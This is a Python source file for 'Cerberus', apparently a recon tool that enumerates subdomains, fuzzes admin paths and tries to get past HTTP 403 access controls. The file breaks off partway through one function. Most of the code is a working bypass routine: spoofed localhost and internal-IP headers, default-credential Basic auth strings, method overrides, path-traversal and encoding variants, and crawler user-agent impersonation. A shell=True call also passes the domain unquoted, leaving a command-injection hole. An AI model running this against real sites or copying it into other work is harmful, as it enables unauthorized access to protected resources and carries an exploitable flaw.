#!/usr/bin/env python3
"""
Cerberus: Gateway Guardian Recon Pipeline Tool
Version: 1.0.1
A polished CLI for 403-focused reconnaissance with these improvements:
1) argparse-based subcommands with clear help
2) Colorized output via colorama
3) ASCII banner + version at startup
4) Output directory support with timestamped files
5) Progress indicators and clean headers
6) Built-in sample mode for testing
7) Fixed adminfuzz to handle both single domains and files with multiple domains
"""
import argparse
import subprocess
import sys
import socket
import random
import string
import os
import requests
import urllib.parse
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init as colorama_init
import time
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
# Initialize colorama
colorama_init(autoreset=True)
# ASCII banner
BANNER = r"""
  _____ ______ _____  ____  ______ _____  _    _  _____
 / ____|  ____|  __ \|  _ \|  ____|  __ \| |  | |/ ____|
| |    | |__  | |__) | |_) | |__  | |__) | |  | | (___
| |    |  __| |  _  /|  _ <|  __| |  _  /| |  | |\___ \
| |____| |____| | \ \| |_) | |____| | \ \| |__| |____) |
 \_____|______|_|  \_\____/|______|_|  \_\\____/|_____/
"""
print(Fore.GREEN + BANNER)
print(Fore.YELLOW + "Cerberus v1.0.1 - Gateway Guardian Recon Pipeline Tool\n")
# Default threads
DEFAULT_THREADS = 10
# Utility to run shell commands
def run(cmd):
    print(Fore.BLUE + f"$ {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(Fore.RED + f"Error: {result.stderr}")
        return False
    return True
# DNS resolve helper
def resolve_domain(domain: str) -> str:
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        return None
# Wildcard detection
def detect_wildcard(base: str) -> str:
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    test = f"{rand}.{base}"
    ip = resolve_domain(test)
    return ip
# Helper function to check if input is a domain or file
def is_domain(input_str):
    """Check if input is a domain name or a file path"""
    # If it's a file that exists, it's a file
    if os.path.isfile(input_str):
        return False
    # If it contains common domain patterns and no path separators, likely a domain
    if ('.' in input_str and
        not input_str.startswith('/') and
        not input_str.startswith('./') and
        '/' not in input_str.replace('https://', '').replace('http://', '')):
        return True
    # Default to file if unsure
    return False
# 403 endpoint scanner function
def scan_403_endpoints(subdomain, wordlist_files, threads=10):
    """Scan for 403 endpoints using wordlists"""
    import requests
    from urllib.parse import urljoin
    found_403s = []
    def check_endpoint(path, base_url):
        test_url = urljoin(f"https://{base_url}", path)
        try:
            response = requests.get(test_url, timeout=5, allow_redirects=False)
            if response.status_code == 403:
                return test_url
        except requests.RequestException:
            # Try HTTP if HTTPS fails
            try:
                test_url = urljoin(f"http://{base_url}", path)
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                if response.status_code == 403:
                    return test_url
            except requests.RequestException:
                pass
        return None
    # Read all wordlist files
    all_paths = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                paths = [line.strip() for line in f if line.strip()]
                # Add common path prefixes
                for path in paths:
                    all_paths.add(f"/{path}")
                    all_paths.add(f"/{path}/")
                    all_paths.add(f"/admin/{path}")
                    all_paths.add(f"/api/{path}")
                print(Fore.CYAN + f"Loaded {len(paths)} paths from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")
    print(Fore.CYAN + f"Total unique paths: {len(all_paths)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")
    if len(all_paths) == 0:
        print(Fore.RED + "No paths loaded from wordlists!")
        return found_403s
    # Use ThreadPoolExecutor for concurrent HTTP requests
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_endpoint, path, subdomain): path
                  for path in all_paths}
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_paths)} checked")
            result = future.result()
            if result:
                found_403s.append(result)
                print(Fore.GREEN + f"✓ 403 Found: {result}")
    return found_403s
# Admin fuzzer function
def fuzz_admin_paths(subdomain, wordlist_files, threads=10):
    """Fuzz admin paths using wordlists"""
    import requests
    from urllib.parse import urljoin
    found_endpoints = []
    def check_admin_path(path, base_url):
        test_url = urljoin(f"https://{base_url}", path)
        try:
            response = requests.get(test_url, timeout=5, allow_redirects=False)
            status = response.status_code
            if status in [200, 401, 403, 302, 301]:  # Interesting responses
                return (test_url, status)
        except requests.RequestException:
            # Try HTTP if HTTPS fails
            try:
                test_url = urljoin(f"http://{base_url}", path)
                response = requests.get(test_url, timeout=5, allow_redirects=False)
                status = response.status_code
                if status in [200, 401, 403, 302, 301]:
                    return (test_url, status)
            except requests.RequestException:
                pass
        return None
    # Read wordlist file
    all_paths = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                paths = [line.strip() for line in f if line.strip()]
                for path in paths:
                    all_paths.add(f"/{path}")
                    all_paths.add(f"/{path}/")
                print(Fore.CYAN + f"Loaded {len(paths)} admin paths from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")
    print(Fore.CYAN + f"Total admin paths: {len(all_paths)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")
    if len(all_paths) == 0:
        print(Fore.RED + "No paths loaded from wordlists!")
        return found_endpoints
    # Use ThreadPoolExecutor for concurrent HTTP requests
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_admin_path, path, subdomain): path
                  for path in all_paths}
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_paths)} checked")
            result = future.result()
            if result:
                url, status = result
                found_endpoints.append(f"{url} [{status}]")
                print(Fore.GREEN + f"✓ Found: {url} [{status}]")
    return found_endpoints
def prepare_output(path: str) -> Path:
    outdir = Path(path)
    outdir.mkdir(parents=True, exist_ok=True)
    return outdir
# Sub-subdomain scanner function
def scan_subsubdomains(subdomain, wordlist_files, threads=10):
    """Scan for sub-subdomains using wordlists"""
    found_subs = set()
    def check_subdomain(word, base_domain):
        test_domain = f"{word}.{base_domain}"
        try:
            ip = resolve_domain(test_domain)
            if ip:
                print(Fore.GREEN + f"✓ Found: {test_domain} -> {ip}")
                return test_domain
        except Exception as e:
            print(Fore.RED + f"✗ Error testing {test_domain}: {e}")
        return None
    # Read all wordlist files
    all_words = set()
    for wordlist_file in wordlist_files:
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
                all_words.update(words)
                print(Fore.CYAN + f"Loaded {len(words)} words from {wordlist_file}")
        except Exception as e:
            print(Fore.RED + f"Error reading {wordlist_file}: {e}")
    print(Fore.CYAN + f"Total unique words: {len(all_words)}")
    print(Fore.CYAN + f"Testing against: {subdomain}")
    if len(all_words) == 0:
        print(Fore.RED + "No words loaded from wordlists!")
        return found_subs
    # Use ThreadPoolExecutor for concurrent DNS lookups
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_subdomain, word, subdomain): word
                  for word in all_words}
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 50 == 0:  # Show progress more frequently
                print(Fore.YELLOW + f"Progress: {completed}/{len(all_words)} checked")
            result = future.result()
            if result:
                found_subs.add(result)
    return found_subs
def bypass_403_endpoints(endpoints_file, threads=5):
    """Test various 403 bypass techniques on endpoints from a file."""
    try:
        with open(endpoints_file, 'r') as f:
            endpoints = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(endpoints)} endpoints from {endpoints_file}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Endpoints file not found: {endpoints_file}")
        return []

    # Session setup with retry strategy
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        status_forcelist=[429, 500, 502, 503, 504],
        backoff_factor=0.5
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    # Fetch initial status code for each endpoint
  # Fetch initial status code for each endpoint
    endpoints_with_status = []
    for endpoint in endpoints:
        try:
            response = session.get(endpoint, timeout=5, allow_redirects=False)
            status_code = response.status_code
            
            # ADD THIS CHECK: If status is 404, skip this endpoint
            if status_code in [200,404,302,301]:
                print(Fore.BLUE + f"Skipping endpoint: {endpoint} [404 Not Found]")
                continue

            endpoints_with_status.append((endpoint, status_code))
            print(Fore.YELLOW + f"Testing endpoint: {endpoint} [{status_code}]")
        except Exception as e:
            print(Fore.RED + f"Failed to fetch status for {endpoint}: {e}")
            endpoints_with_status.append((endpoint, 'Unknown')) 

    # User agents for rotation
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'Twitterbot/1.0',
        'LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)',
        'WhatsApp/2.16.7',
    ]

    # HTTP Methods to test
    methods = [
        'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE',
        'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK',
        'UNLOCK', 'VERSION-CONTROL', 'REPORT', 'CHECKOUT', 'CHECKIN', 'UNCHECKOUT',
        'MKWORKSPACE', 'UPDATE', 'LABEL', 'MERGE', 'BASELINE-CONTROL', 'MKACTIVITY'
    ]

    # Comprehensive bypass headers
    bypass_headers = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'X-Originating-IP': '127.0.0.1'},
        {'X-Remote-IP': '127.0.0.1'},
        {'X-Remote-Addr': '127.0.0.1'},
        {'X-Client-IP': '127.0.0.1'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-For': '0.0.0.0'},
        {'X-Forwarded-For': '2130706433'},
        {'X-Forwarded-For': '0x7F000001'},
        {'X-Forwarded-For': '127.1'},
        {'X-Forwarded-For': '127.000.000.1'},
        {'X-Forwarded-For': '::1'},
        {'X-Forwarded-For': '0000:0000:0000:0000:0000:0000:0000:0001'},
        {'X-Forwarded-For': '192.168.1.1'},
        {'X-Forwarded-For': '10.0.0.1'},
        {'X-Forwarded-For': '172.16.0.1'},
        {'X-Forwarded-For': '169.254.169.254'},
        {'X-Forwarded-For': '127.0.0.1:80'},
        {'X-Forwarded-For': '127.0.0.1:443'},
        {'X-Forwarded-For': '127.0.0.1:8080'},
        {'X-Forwarded-For': '127.0.0.1, 127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1, 192.168.1.1'},
        {'X-Forwarded-For': 'localhost, 127.0.0.1'},
        {'X-Real-IP': '0.0.0.0'},
        {'X-Real-IP': '192.168.1.1'},
        {'X-Real-IP': '10.0.0.1'},
        {'X-Real-IP': '::1'},
        {'Client-IP': '127.0.0.1'},
        {'Client-IP': '0.0.0.0'},
        {'True-Client-IP': '127.0.0.1'},
        {'True-Client-IP': '0.0.0.0'},
        {'X-Cluster-Client-IP': '127.0.0.1'},
        {'X-ProxyUser-Ip': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {'CF-Connecting-IP': '0.0.0.0'},
        {'Fastly-Client-Ip': '127.0.0.1'},
        {'X-Azure-ClientIP': '127.0.0.1'},
        {'X-Azure-SocketIP': '127.0.0.1'},
        {'Host': 'localhost'},
        {'Host': '127.0.0.1'},
        {'Host': '0.0.0.0'},
        {'Host': 'admin.localhost'},
        {'Host': 'internal.localhost'},
        {'X-Host': 'localhost'},
        {'X-Forwarded-Host': 'localhost'},
        {'X-Forwarded-Host': '127.0.0.1'},
        {'X-Forwarded-Server': 'localhost'},
        {'X-HTTP-Host-Override': 'localhost'},
        {'Authorization': 'Basic YWRtaW46YWRtaW4='},
        {'Authorization': 'Basic cm9vdDpyb290'},
        {'Authorization': 'Basic dGVzdDp0ZXN0'},
        {'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='},
        {'Authorization': 'Basic YWRtaW46cGFzc3dvcmQ='},
        {'Authorization': 'Bearer token'},
        {'Authorization': 'Bearer admin'},
        {'Authorization': 'Bearer test'},
        {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'},
        {'Authorization': 'Digest username="admin"'},
        {'Authorization': 'NTLM'},
        {'Authorization': 'Negotiate'},
        {'X-HTTP-Method-Override': 'GET'},
        {'X-HTTP-Method-Override': 'POST'},
        {'X-HTTP-Method-Override': 'PUT'},
        {'X-HTTP-Method-Override': 'DELETE'},
        {'X-Method-Override': 'GET'},
        {'X-Method-Override': 'POST'},
        {'_method': 'GET'},
        {'_method': 'POST'},
        {'X-Requested-With': 'XMLHttpRequest'},
        {'X-Forwarded-Proto': 'https'},
        {'X-Forwarded-Ssl': 'on'},
        {'X-Url-Scheme': 'https'},
        {'Front-End-Https': 'on'},
        {'X-Forwarded-Protocol': 'https'},
        {'X-Forwarded-Scheme': 'https'},
        {'X-Scheme': 'https'},
        {'X-Original-URL': '/'},
        {'X-Original-URL': '/admin'},
        {'X-Original-URL': '/api'},
        {'X-Rewrite-URL': '/'},
        {'X-Rewrite-URL': '/admin'},
        {'X-Rewrite-URL': '/api'},
        {'X-Override-URL': '/'},
        {'X-Request-URI': '/'},
        {'Referer': 'https://google.com/'},
        {'Referer': 'https://localhost/'},
        {'Referer': 'https://127.0.0.1/'},
        {'Referer': 'https://admin.localhost/'},
        {'Referer': 'https://internal.localhost/'},
        {'Referrer': 'https://google.com/'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
        {'User-Agent': 'Bingbot/2.0 (+http://www.bing.com/bingbot.htm)'},
        {'User-Agent': 'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)'},
        {'User-Agent': 'DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)'},
        {'User-Agent': 'Baiduspider/2.0; (+http://www.baidu.com/search/spider.html)'},
        {'User-Agent': 'YandexBot/3.0; (+http://yandex.com/bots)'},
        {'User-Agent': 'facebot'},
        {'User-Agent': 'ia_archiver'},
        {'User-Agent': 'Twitterbot/1.0'},
        {'User-Agent': 'Pinterest/0.1 +http://pinterest.com/'},
        {'X-Custom-IP-Authorization': '127.0.0.1'},
        {'X-Source-IP': '127.0.0.1'},
        {'X-Forwarded': '127.0.0.1'},
        {'Forwarded-For': '127.0.0.1'},
        {'Forwarded': 'for=127.0.0.1'},
        {'Forwarded': 'for=localhost'},
        {'X-Remote-Host': 'localhost'},
        {'X-Remote-Hostname': 'localhost'},
        {'Akamai-Origin-Hop': '1'},
        {'CloudFront-Forwarded-Proto': 'https'},
        {'CloudFront-Is-Desktop-Viewer': 'true'},
        {'CloudFront-Is-Mobile-Viewer': 'false'},
        {'X-Edge-Location': 'cache'},
        {'X-Accel-Redirect': '/'},
        {'X-Sendfile': '/'},
        {'X-Sendfile-Type': 'X-Accel-Redirect'},
        {'Content-Type': 'application/json'},
        {'Content-Type': 'application/xml'},
        {'Content-Type': 'text/xml'},
        {'Content-Type': 'application/x-www-form-urlencoded'},
        {'Accept': '*/*'},
        {'Accept': 'application/json'},
        {'Accept': 'text/html'},
        {'Accept': 'application/xml'},
        {'Cache-Control': 'no-cache'},
        {'Cache-Control': 'max-age=0'},
        {'Pragma': 'no-cache'},
        {'Origin': 'https://localhost'},
        {'Origin': 'https://127.0.0.1'},
        {'Origin': 'null'},
        {'Access-Control-Request-Method': 'GET'},
        {'Access-Control-Request-Headers': 'content-type'},
        {'Translate': 'f'},
        {'Depth': '0'},
        {'Depth': '1'},
        {'Depth': 'infinity'},
        {'X-Admin': 'true'},
        {'X-Admin': '1'},
        {'Admin': 'true'},
        {'Is-Admin': 'true'},
        {'X-Debug': 'true'},
        {'Debug': '1'},
        {'X-Test': 'true'},
        {'Test': '1'},
    ]

    # Function to generate URL variations
    def generate_url_variations(url):
        variations = []
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        query = parsed.query
        
        # Basic variations
        variations.extend([
            url,
            url + '/',
            url + '//',
            url + '///',
            url + '////',
            url + '?',
            url + '#',
            url + '?test=1',
            url + '#test',
        ])
        
        # Path traversal variations
        if path:
            variations.extend([
                url + '/%2e/',
                url + '/%2e%2e/',
                url + '/%252e/',
                url + '/%252e%252e/',
                url + '/./',
                url + '/../',
                url + '/..;/',
                url + '/../..',
                url + '/../../',
                url + '/.././',
                url + '/./../',
                url + '/.//',
                url + '//.',
                url + '//..;/',
                url + '/;/',
                url + '/?/',
                url + '/&/',
                url.replace(path, path + '/..'),
                url.replace(path, path + '/../'),
                url.replace(path, '/../' + path),
                url.replace(path, '/./' + path),
            ])
        
        # Null byte and special character variations
        variations.extend([
            url + '/%00/',
            url + '/%00',
            url + '%00',
            url + '/%0a/',
            url + '/%0d/',
            url + '/%09/',
            url + '/%0c/',
            url + '/%20/',
            url + '/%a0/',
            url + '/%2f/',
            url + '/%5c/',
            url + '/%3f/',
            url + '/%23/',
            url + '/%26/',
            url + '/%3d/',
            url + '/%2b/',
            url + '/%40/',
            url + '/%7e/',
        ])
        
        # Double encoding variations
        if path:
            variations.extend([
                url.replace(path, urllib.parse.quote(path, safe='')),
                url.replace(path, urllib.parse.quote(urllib.parse.quote(path, safe=''), safe='')),
                url.replace(path, path.replace('/', '%2f')),
                url.replace(path, path.replace('/', '%252f')),
                url.replace(path, path.replace('/', '%2F')),
                url.replace(path, path.replace('/', '\\').replace('\\', '%5c')),
            ])
        
        # Case variations
        if path:
            variations.extend([
                url.replace(path, path.upper()),
                url.replace(path, path.lower()),
                url.replace(path, path.title()),
                url.replace(path, path.swapcase()),
            ])
            # Mixed case variations for each character
            if len(path) > 1:
                for i in range(min(len(path), 5)):  # Limit to avoid too many variations
                    if path[i].isalpha():
                        varied_path = path[:i] + path[i].swapcase() + path[i+1:]
                        variations.append(url.replace(path, varied_path))
        
        # Extension variations
        if '.' in path and path != '/':
            base_path = path.rsplit('.', 1)[0]
            extension = path.rsplit('.', 1)[1]
            variations.extend([
                url.rsplit('.', 1)[0],
                url.replace('.' + extension, ''),
                url.replace('.' + extension, '.bak'),
                url.replace('.' + extension, '.old'),
                url.replace('.' + extension, '.orig'),
                url.replace('.' + extension, '.tmp'),
                url.replace('.' + extension, '.backup'),
                url.replace('.' + extension, '~'),
                url + '.bak',
                url + '.old',
                url + '.orig',
                url + '.tmp',
                url + '~',
                url + '.backup',
            ])
        
        # HTTP parameter pollution
        if '?' in url:
            variations.extend([
                url + '&debug=1',
                url + '&test=1',
                url + '&admin=1',
                url + '&access=1',
                url + '&bypass=1',
                url + '&override=1',
            ])
        else:
            variations.extend([
                url + '?debug=1',
                url + '?test=1',
                url + '?admin=1',
                url + '?access=1',
                url + '?bypass=1',
                url + '?override=1',
            ])
        
        # HTTP version variations and protocol manipulation
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        if parsed.scheme == 'https':
            variations.append(url.replace('https://', 'http://'))
        elif parsed.scheme == 'http':
            variations.append(url.replace('http://', 'https://'))
        
        # Unicode and internationalization bypasses
        if path:
            # Unicode normalization bypasses
            try:
                import unicodedata
                normalized_path = unicodedata.normalize('NFKC', path)
                if normalized_path != path:
                    variations.append(url.replace(path, normalized_path))
            except:
                pass
            
            # Unicode character variations
            unicode_variations = {
                '/': ['%2F', '%2f', '%u002F', '%u002f', '\\', '%5C', '%5c'],
                '.': ['%2E', '%2e', '%u002E', '%u002e'],
                '?': ['%3F', '%3f', '%u003F', '%u003f'],
                '#': ['%23', '%u0023'],
                '&': ['%26', '%u0026'],
                '=': ['%3D', '%3d', '%u003D', '%u003d'],
                '+': ['%2B', '%2b', '%u002B', '%u002b'],
                ' ': ['%20', '+', '%u0020'],
            }
            
            for char, encodings in unicode_variations.items():
                if char in path:
                    for encoding in encodings[:2]:  # Limit to avoid too many
                        variations.append(url.replace(char, encoding))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_variations = []
        for var in variations:
            if var not in seen:
                seen.add(var)
                unique_variations.append(var)
        
        return unique_variations

    # Function to test a single request with proper delay and technique identification
    def test_request(method, test_url, headers=None, data=None, technique_type="", technique_description=""):
        if headers is None:
            headers = {}
        
        # Randomly rotate user agent if not specified in headers
        if 'User-Agent' not in headers:
            headers = headers.copy()
            headers['User-Agent'] = random.choice(user_agents)
        
        try:
            # Proper delay implementation - random delay between 0.1 to 0.5 seconds
            delay = random.uniform(0.1, 0.4)
            time.sleep(delay)
            
            response = session.request(
                method=method,
                url=test_url,
                headers=headers,
                data=data,
                allow_redirects=False,
                timeout=10,
                verify=True
            )
            
            # Consider various success indicators
            is_success = (
                response.status_code not in [404, 403, 401, 301, 302, 400] and
                response.status_code < 500 and
                'forbidden' not in response.text.lower()[:200] and
                'access denied' not in response.text.lower()[:200] and
                'unauthorized' not in response.text.lower()[:200]
            )
            
            return {
                'method': method,
                'url': test_url,
                'headers': {k: v for k, v in headers.items() if k != 'User-Agent'},
                'status_code': response.status_code,
                'content_length': len(response.content),
                'success': is_success,
                'response_headers': dict(response.headers),
                'technique_type': technique_type,
                'technique_description': technique_description
            }
        except Exception as e:
            return {
                'method': method,
                'url': test_url,
                'headers': headers,
                'status_code': 'ERROR',
                'error': str(e),
                'success': False,
                'technique_type': technique_type,
                'technique_description': technique_description
            }

    # Test all endpoints
    all_results = []
    max_attempts = 1000000  # Increased to ensure all endpoints are tested
    attempts = 0
    
    for endpoint, status_code in endpoints_with_status:
        print(Fore.CYAN + f"\n=== Testing endpoint: {endpoint} [Original: {status_code}] ===")
        
        # Test different HTTP methods
        for method in methods:
            if attempts >= max_attempts:
                break
            attempts += 1
            
            technique_desc = f"HTTP Method: {method}"
            print(Fore.BLUE + f"[{attempts}] Trying {technique_desc} on {endpoint}")
            
            result = test_request(method, endpoint, technique_type="HTTP_METHOD", technique_description=technique_desc)
            if result and result['success']:
                all_results.append(result)
                print(Fore.GREEN + f"✓ [{technique_desc}] {method} {endpoint} [{status_code}] -> {result['status_code']} ({result['content_length']} bytes)")
        
        # Test header bypasses with GET method
        for i, headers in enumerate(bypass_headers):
            if attempts >= max_attempts:
                break
            attempts += 1
            
            header_name = list(headers.keys())[0]
            header_value = list(headers.values())[0]
            technique_desc = f"Header Bypass: {header_name}={header_value}"
            print(Fore.BLUE + f"[{attempts}] Trying {technique_desc} on {endpoint}")
            
            result = test_request('GET', endpoint, headers, technique_type="HEADER_BYPASS", technique_description=technique_desc)
            if result and result['success']:
                all_results.append(result)
                print(Fore.GREEN + f"✓ [{technique_desc}] GET {endpoint} [{status_code}] -> {result['status_code']} ({result['content_length']} bytes)")
        
        # Test URL variations with GET method
        variations = generate_url_variations(endpoint)
        for variation in variations:
            if attempts >= max_attempts:
                break
            if variation != endpoint:  # Skip original URL
                attempts += 1
                
                technique_desc = f"URL Variation: {variation}"
                print(Fore.BLUE + f"[{attempts}] Trying {technique_desc}")
                
                result = test_request('GET', variation, technique_type="URL_VARIATION", technique_description=technique_desc)
                if result and result['success']:
                    all_results.append(result)
                    print(Fore.GREEN + f"✓ [URL Variation] GET {variation} [{status_code}] -> {result['status_code']} ({result['content_length']} bytes)")
        
        # Test POST with data variations
        post_data_variations = [
            ({}, "Empty POST data"),
            ({'admin': '1'}, "POST data: admin=1"),
            ({'debug': '1'}, "POST data: debug=1"),
            ({'test': '1'}, "POST data: test=1"),
            ({'access': 'admin'}, "POST data: access=admin"),
            ({'role': 'admin'}, "POST data: role=admin"),
            ({'user': 'admin'}, "POST data: user=admin"),
            ({'_method': 'GET'}, "POST data: _method=GET"),
            ({'_method': 'PUT'}, "POST data: _method=PUT"),
            ({'override': 'true'}, "POST data: override=true"),
        ]
        
        for data, data_desc in post_data_variations:
            if attempts >= max_attempts:
                break
            attempts += 1
            
            print(Fore.BLUE + f"[{attempts}] Trying {data_desc} on {endpoint}")
            
            result = test_request('POST', endpoint, data=data, technique_type="POST_DATA", technique_description=data_desc)
            if result and result['success']:
                all_results.append(result)
                print(Fore.GREEN + f"✓ [{data_desc}] POST {endpoint} [{status_code}] -> {result['status_code']} ({result['content_length']} bytes)")
        
        # Test successful header combinations with different methods
        successful_headers = [r['headers'] for r in all_results if r['headers']][:3]
        for headers in successful_headers:
            for method in ['POST', 'PUT', 'DELETE']:
                if attempts >= max_attempts:
                    break
                attempts += 1
                
                header_str = ', '.join([f"{k}={v}" for k, v in headers.items()])
                technique_desc = f"Successful Header Combo + {method}: {header_str}"
                print(Fore.BLUE + f"[{attempts}] Trying {technique_desc} on {endpoint}")
                
                result = test_request(method, endpoint, headers, technique_type="HEADER_METHOD_COMBO", technique_description=technique_desc)
                if result and result['success']:
                    all_results.append(result)
                    print(Fore.GREEN + f"✓ [{technique_desc}] {method} {endpoint} [{status_code}] -> {result['status_code']} ({result['content_length']} bytes)")

    print(Fore.CYAN + f"\nCompleted {attempts} bypass attempts")
    print(Fore.GREEN + f"Found {len(all_results)} successful bypasses")
    
    # Sort results by status code and content length for better analysis
    all_results.sort(key=lambda x: (x['status_code'], -x.get('content_length', 0)))
    
    return all_results


def bypass_test(args):
    """Test comprehensive 403 bypass techniques on endpoints"""
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'bypass_results.txt')
    
    print(Fore.GREEN + f"[+] Testing 403 bypasses on endpoints from {args.endpoints_file}...\n")
    
    bypasses = bypass_403_endpoints(args.endpoints_file, 5)
    
    # Save results with enhanced formatting
    with open(outfile, 'w') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"# 403 Bypass Test Results - {timestamp}\n")
        f.write(f"# Total bypasses found: {len(bypasses)}\n\n")
        
        for i, bypass in enumerate(bypasses, 1):
            f.write(f"=== Bypass #{i} ===\n")
            f.write(f"URL: {bypass['url']}\n")
            f.write(f"Method: {bypass['method']}\n")
            f.write(f"Status: {bypass['status_code']}\n")
            f.write(f"Content Length: {bypass.get('content_length', 'N/A')} bytes\n")
            f.write(f"Technique Type: {bypass.get('technique_type', 'N/A')}\n")
            f.write(f"Technique Description: {bypass.get('technique_description', 'N/A')}\n")
            
            if bypass.get('headers'):
                headers_str = ', '.join([f"{k}: {v}" for k, v in bypass['headers'].items()])
                f.write(f"Headers: {headers_str}\n")
            
            f.write("-" * 60 + "\n\n")
    
    print(Fore.GREEN + f"\n[✓] Total bypasses found: {len(bypasses)}")
    print(Fore.GREEN + f"[✓] Results saved to {outfile}\n")
    
    # Print summary by technique type
    if bypasses:
        print(Fore.CYAN + "\n=== Bypass Summary by Technique ===")
        technique_counts = {}
        for bypass in bypasses:
            tech_type = bypass.get('technique_type', 'Unknown')
            technique_counts[tech_type] = technique_counts.get(tech_type, 0) + 1
        
        for tech_type, count in sorted(technique_counts.items()):
            print(Fore.YELLOW + f"{tech_type}: {count} successful bypasses")# Subcommand implementations
def enum_subdomains(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subs_all.txt')
    print(Fore.GREEN + f"[+] Enumerating subdomains for {args.domain}...")
    cmd = f"subfinder -d {args.domain} -silent -o {outfile}"
    if run(cmd):
        print(Fore.GREEN + f"[✓] Subdomains saved to {outfile}\n")
    else:
        print(Fore.RED + f"[✗] Failed to enumerate subdomains\n")
def filter_wildcard(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subs_filtered.txt')
    print(Fore.GREEN + f"[+] Filtering wildcards on {args.domain}...\n")

    # Check if the subs_file exists and is readable
    try:
        with open(args.subs_file, 'r') as f:
            subdomains = [line.strip() for line in f if line.strip()]
        print(Fore.CYAN + f"Loaded {len(subdomains)} subdomains from {args.subs_file}")
    except FileNotFoundError:
        print(Fore.RED + f"[✗] Subdomains file not found: {args.subs_file}")
        return

    # Detect wildcard DNS
    wildcard_ip = detect_wildcard(args.domain)
    if wildcard_ip:
        print(Fore.YELLOW + f"Detected wildcard DNS IP: {wildcard_ip}")
    else:
        print(Fore.CYAN + "No wildcard DNS detected.")
        # If no wildcard detected, just copy the input to output
        with open(outfile, 'w') as f:
            for sub in subdomains:
                f.write(f"{sub}\n")
        print(Fore.GREEN + f"[✓] No wildcard DNS detected. All subdomains saved to {outfile}\n")
        return

    # Filter out subdomains that resolve to the wildcard IP
    filtered_subdomains = []
    for subdomain in subdomains:
        ip = resolve_domain(subdomain)
        if ip and ip != wildcard_ip:
            filtered_subdomains.append(subdomain)
        else:
            print(Fore.RED + f"Filtered out wildcard: {subdomain}")

    # Write filtered subdomains to the output file
    with open(outfile, 'w') as f:
        for sub in filtered_subdomains:
            f.write(f"{sub}\n")

    print(Fore.GREEN + f"[✓] Filtered subdomains saved to {outfile}\n")
    print(Fore.GREEN + f"Filtered out {len(subdomains) - len(filtered_subdomains)} wildcard entries")
    print(Fore.GREEN + f"Remaining subdomains: {len(filtered_subdomains)}")

def subscan(args):
    outdir = prepare_output(args.output_dir)
    outfile = outdir / (args.output or 'subsubs.txt')
